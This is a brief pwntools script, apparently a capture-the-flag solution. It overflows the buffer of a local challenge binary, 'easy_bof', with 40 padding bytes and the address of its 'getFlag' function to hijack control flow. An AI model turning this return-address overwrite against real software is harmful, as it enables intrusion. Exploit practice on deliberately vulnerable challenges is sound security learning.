import pwn

p = pwn.process("./easy_bof")
elf = pwn.ELF("./easy_bof")

p.sendline(b"A"*(16+24)+pwn.p64(elf.symbols["getFlag"]))
p.interactive()
